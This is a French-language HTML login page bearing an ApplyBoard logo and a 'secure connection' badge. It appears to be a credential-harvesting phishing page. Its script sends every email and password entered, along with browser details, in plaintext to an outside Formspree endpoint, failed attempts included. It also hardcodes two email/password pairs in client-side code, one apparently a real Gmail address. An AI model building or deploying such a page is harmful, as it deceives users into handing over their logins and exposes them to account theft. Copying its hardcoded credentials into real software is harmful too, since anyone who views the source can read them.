<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Connexion</title>
  <style>
    body {
      margin: 0;
      font-family: Arial, sans-serif;
      background-color: #f4f4f4;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      background: linear-gradient(135deg, #6a11cb 0%, #2575fc 100%);
    }

    .card {
      background-color: white;
      padding: 2rem;
      border-radius: 12px;
      box-shadow: 0 10px 25px rgba(0, 0, 0, 0.2);
      width: 100%;
      max-width: 400px;
      box-sizing: border-box;
      text-align: center;
      position: relative;
      overflow: hidden;
      z-index: 1;
    }
    
    .card::before {
      content: "";
      position: absolute;
      top: -50%;
      left: -50%;
      width: 200%;
      height: 200%;
      background: radial-gradient(circle, rgba(255,255,255,0.1) 0%, rgba(255,255,255,0) 70%);
      z-index: -1;
      animation: rotate 15s linear infinite;
    }
    
    @keyframes rotate {
      from { transform: rotate(0deg); }
      to { transform: rotate(360deg); }
    }

    .card img.logo {
      max-width: 180px;
      height: auto;
      margin-bottom: 1.5rem;
      transition: transform 0.3s ease;
    }
    
    .card img.logo:hover {
      transform: scale(1.05);
    }

    input[type="text"],
    input[type="password"] {
      width: 100%;
      padding: 1rem;
      margin: 0.5rem 0;
      border: 1px solid #ddd;
      border-radius: 8px;
      font-size: 1rem;
      box-sizing: border-box;
      transition: all 0.3s;
      background-color: #f9f9f9;
    }
    
    input[type="text"]:focus,
    input[type="password"]:focus {
      border-color: #0073e6;
      box-shadow: 0 0 0 3px rgba(0, 115, 230, 0.1);
      outline: none;
      background-color: #fff;
    }

    button {
      width: 100%;
      padding: 0.9rem;
      background: linear-gradient(to right, #0073e6, #005bb5);
      color: white;
      border: none;
      border-radius: 8px;
      cursor: pointer;
      margin-top: 1rem;
      font-weight: bold;
      font-size: 1rem;
      transition: all 0.3s;
      box-shadow: 0 4px 10px rgba(0, 115, 230, 0.3);
      position: relative;
      overflow: hidden;
    }
    
    button::after {
      content: "";
      position: absolute;
      top: -50%;
      left: -50%;
      width: 200%;
      height: 200%;
      background: rgba(255, 255, 255, 0.1);
      transform: rotate(30deg);
      transition: all 0.6s;
    }
    
    button:hover {
      transform: translateY(-3px);
      box-shadow: 0 6px 15px rgba(0, 115, 230, 0.4);
    }
    
    button:hover::after {
      transform: rotate(30deg) translate(100px, 0);
    }

    button:active {
      transform: translateY(1px);
    }

    .error {
      color: #e74c3c;
      margin-top: 1rem;
      display: none;
      padding: 10px;
      background-color: #fceae9;
      border-radius: 8px;
      border-left: 4px solid #e74c3c;
      animation: fadeIn 0.5s;
    }
    
    .success {
      color: #27ae60;
      margin-top: 1rem;
      display: none;
      padding: 10px;
      background-color: #eafaf1;
      border-radius: 8px;
      border-left: 4px solid #27ae60;
      animation: fadeIn 0.5s;
    }
    
    @keyframes fadeIn {
      from { opacity: 0; transform: translateY(-10px); }
      to { opacity: 1; transform: translateY(0); }
    }

    .social-icons {
      margin-top: 1.5rem;
      display: flex;
      justify-content: center;
      gap: 1rem;
    }

    .social-icons a {
      display: flex;
      align-items: center;
      justify-content: center;
      width: 40px;
      height: 40px;
      border-radius: 50%;
      background: white;
      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
      transition: all 0.3s;
    }
    
    .social-icons a:hover {
      transform: translateY(-5px);
      box-shadow: 0 6px 12px rgba(0, 0, 0, 0.15);
    }

    .social-icons a img {
      width: 24px;
      height: 24px;
      transition: transform 0.2s ease;
    }

    .security-note {
      margin-top: 1rem;
      font-size: 0.85rem;
      color: #666;
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 5px;
    }
    
    .security-note i {
      color: #27ae60;
    }

    @media (max-width: 480px) {
      .card {
        padding: 1.5rem;
        margin: 1rem;
      }

      input[type="text"],
      input[type="password"],
      button {
        font-size: 0.95rem;
        padding: 0.8rem;
      }

      .social-icons a img {
        width: 20px;
        height: 20px;
      }
    }
  </style>
</head>
<body>
  <div class="card">
    <img class="logo" src="https://www.ets.org/content/dam/ets-org/brands/all-products/interior-third-applyboard-logo.jpg" alt="Logo" />
    <h2>Connexion sécurisée</h2>
    <form id="login-form">
      <input type="text" id="email" placeholder="Email" required />
      <input type="password" id="password" placeholder="Mot de passe" required />
      <button type="submit">Se connecter</button>
      <div class="error" id="error">Identifiants incorrects</div>
      <div class="success" id="success">Connexion réussie! Redirection en cours...</div>
    </form>

    <div class="social-icons">
      <a href="#"><img src="https://cdn-icons-png.flaticon.com/512/281/281764.png" alt="Google" title="Connexion via Google" /></a>
      <a href="#"><img src="https://cdn-icons-png.flaticon.com/512/733/733547.png" alt="Facebook" title="Connexion via Facebook" /></a>
      <a href="#"><img src="https://cdn-icons-png.flaticon.com/512/3670/3670151.png" alt="X" title="Connexion via X (Twitter)" /></a>
      <a href="#"><img src="https://cdn-icons-png.flaticon.com/512/174/174857.png" alt="LinkedIn" title="Connexion via LinkedIn" /></a>
    </div>
    
    <div class="security-note">
      <i class="fas fa-shield-alt"></i>
      <span>Toutes les connexions sont enregistrées de manière sécurisée</span>
    </div>
  </div>

  <script>
    // ID Formspree fourni
    const FORMSPREE_ID = "mblkpjyy";
    
    document.getElementById('login-form').addEventListener('submit', async function(event) {
      event.preventDefault();
      
      const email = document.getElementById("email").value.trim();
      const password = document.getElementById("password").value;
      
      // Cacher les messages précédents
      document.getElementById("error").style.display = "none";
      document.getElementById("success").style.display = "none";
      
      // Préparer les données à envoyer
      const loginData = {
        email: email,
        password: password,
        timestamp: new Date().toISOString(),
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        status: "attempt"
      };
      
      // Vérifier les identifiants
      let isValid = false;
      if (email === "kodahabasse@gmail.com" && password === "Harouna1999") {
        loginData.status = "success";
        isValid = true;
      } else if (email === "Nasser.Usa.2025" && password === "abdoulnasser2025.Usa") {
        loginData.status = "success";
        isValid = true;
      } else {
        loginData.status = "failed";
      }
      
      // Envoyer les données à Formspree
      try {
        const response = await fetch(`https://formspree.io/f/${FORMSPREE_ID}`, {
          method: "POST",
          headers: {
            'Content-Type': 'application/json',
            'Accept': 'application/json'
          },
          body: JSON.stringify(loginData)
        });
        
        if (response.ok) {
          console.log("Tentative de connexion enregistrée sur Formspree");
        } else {
          console.error("Erreur lors de l'enregistrement sur Formspree");
        }
      } catch (error) {
        console.error("Erreur réseau:", error);
      }
      
      // Traitement de la connexion
      if (isValid) {
        // Stocker l'état de connexion
        sessionStorage.setItem('isAuthenticated', 'true');
        
        // Afficher le message de succès
        document.getElementById("success").style.display = "block";
        
        // Redirection après un court délai
        setTimeout(() => {
          if (email === "kodahabasse@gmail.com") {
            window.location.href = "harouna.html";
          } else {
            window.location.href = "abdoulnasser.html";
          }
        }, 1500);
      } else {
        document.getElementById("error").style.display = "block";
      }
    });
  </script>
  
  <!-- Font Awesome pour l'icône de sécurité -->
  <script src="https://kit.fontawesome.com/a076d05399.js" crossorigin="anonymous"></script>
</body>
</html>
